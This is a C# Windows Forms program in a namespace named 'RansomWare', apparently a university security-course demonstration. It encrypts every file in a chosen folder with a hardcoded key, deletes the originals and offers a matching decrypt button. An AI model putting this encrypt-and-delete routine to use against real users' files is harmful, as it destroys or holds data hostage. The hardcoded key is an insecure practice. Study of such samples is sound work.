using EncryptDoc;

namespace RansomWare;

public partial class Principal : Form
{
    private Label lblTitulo = new();
    private TextBox txtCarpeta = new();
    private Button btnBuscar = new();
    private Button btnEncriptar = new();

    private Button btnDesencriptar = new();


    public Principal()
    {
        SuspendLayout();
        Text = "Principal";
        ClientSize = new Size(400, 300);
        MaximizeBox = false;
        StartPosition = FormStartPosition.CenterScreen;
        FormBorderStyle = FormBorderStyle.FixedToolWindow;

        //controles 
        lblTitulo.Location = new Point(10, 5);
        lblTitulo.Name = "lblTitulo";
        lblTitulo.Text = "Buscar Carpeta";
        lblTitulo.ForeColor = Color.Blue;
        Controls.Add(lblTitulo);

        txtCarpeta.Location = new Point(10, 30);
        txtCarpeta.Size = new Size(350, 30);
        txtCarpeta.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
        txtCarpeta.Name = "txtCarpeta";
        Controls.Add(txtCarpeta);

        btnBuscar.Text = "buscar";
        btnBuscar.Name = "btnBuscar";
        btnBuscar.Size= new Size(110,40);
        btnBuscar.Location = new Point(10, 65);
        btnBuscar.Click +=Click_btnBuscarCarpeta;
        Controls.Add(btnBuscar);

        btnEncriptar.Text = "Encriptar";
        btnEncriptar.Name = "btnEncriptar";
        btnEncriptar.Size= new Size(110,40);
        btnEncriptar.Location = new Point(120, 65);
        btnEncriptar.Click +=Click_btnEncriptar;
        Controls.Add(btnEncriptar);

        btnDesencriptar.Text = "Desencriptar";
        btnDesencriptar.Name = "btnDesencriptar";
        btnDesencriptar.Size= new Size(110,40);
        btnDesencriptar.Location = new Point(230, 65);
        btnDesencriptar.Click +=Click_btnDesencriptar;
        Controls.Add(btnDesencriptar);





        ResumeLayout();
        PerformLayout();

    }

    private void Click_btnBuscarCarpeta(object? sender,EventArgs e)
    {
       FolderBrowserDialog folderBrowserDialog = new();
       DialogResult result = folderBrowserDialog.ShowDialog();
       txtCarpeta.Text = folderBrowserDialog.SelectedPath;
    }

    private void Click_btnEncriptar(object? sender,EventArgs e)
    {
       try
       {
        if(Directory.Exists(txtCarpeta.Text))
        {
            string []archivos = Directory.GetFiles(txtCarpeta.Text);

            foreach (var archivo in archivos)
            {
                Encrypt.EncryptFile(archivo,archivo+".univalle","SeguridadInformaticaUnivalle");
                File.Delete(archivo);
            }
        }
       }
       catch(Exception Error)
       {
        MessageBox.Show(Error.Message);
       }
    }

    private void Click_btnDesencriptar(object? sender,EventArgs e)
    {
       try
       {
            if (Directory.Exists(txtCarpeta.Text))
            {
                string []archivos = Directory.GetFiles(txtCarpeta.Text);
                foreach (var archivo in archivos)
                {
                    string ArchivoSinExtension = Path.GetFileNameWithoutExtension(archivo);
                    Encrypt.DecryptFile(archivo,Path.Combine(txtCarpeta.Text,ArchivoSinExtension),"SeguridadInformaticaUnivalle");
                    File.Delete(archivo);
                }
            }
       }
       catch (Exception Error)
       {
        MessageBox.Show("Error Message");
       }
    }
}








